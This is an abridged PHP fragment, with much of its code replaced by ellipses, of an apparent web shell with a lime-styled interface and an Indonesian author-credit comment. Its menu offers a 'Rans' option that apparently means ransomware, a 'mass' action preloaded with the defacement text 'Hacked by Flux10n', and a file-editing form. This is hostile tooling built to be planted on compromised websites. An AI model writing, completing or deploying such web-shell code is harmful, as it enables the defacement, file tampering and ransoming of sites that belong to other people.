<?php
//hargai author dengan cara menggunakan script ini dan tidak merename nama pembuat dan mereuploadnya!!!
session_start();
@error_reporting(0);
@set_time_limit(0);
...
hr {
    border:0;
    height:1px;
    background-image: linear-gradient(to right, #1e1e1e, lime, lime, #1e1e1e);
}
...
function action() {
	...
	print "<li>[ <a href='?dir=".path()."&do=rans'>Rans</a> ]</li>";
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Flux10n</textarea><br>
	...
	elseif(isset($_GET['act'])) {
		...
		elseif($_GET['act'] === 'edit') {
			...
			<center><input type='submit' class='input' value='SAVE' name='save' style='width: 500px;'>
			</form></center>";
		} 
